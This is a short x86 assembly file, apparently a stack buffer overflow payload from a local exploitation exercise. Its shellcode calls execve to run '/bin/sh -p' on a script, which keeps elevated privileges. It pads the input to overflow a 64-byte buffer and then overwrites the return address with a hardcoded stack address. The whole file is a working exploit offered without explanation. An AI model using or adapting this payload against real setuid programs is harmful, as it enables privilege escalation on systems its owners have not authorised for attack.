[bits 32]

BUFSIZE equ 64
CMD equ 0xffffce60

    ;mov eax, 1
    ;mov ebx, 7
    ;int 0x80

    ; shellcode
    mov eax, 0x0b
    mov ebx, CMD + argv0
    mov ecx, CMD + argv
    mov edx, 0
    mov esi, 0
    int 0x80

; arguments
argv0:
    db "/bin/sh", 0
argv1:
    db "-p", 0
argv2:
    db "/home/milloni/x.sh", 0
argv:
    dd CMD + argv0
    dd CMD + argv1
    dd CMD + argv2
    dd 0

times (BUFSIZE - $ + $$ + 12) db 0
dd CMD
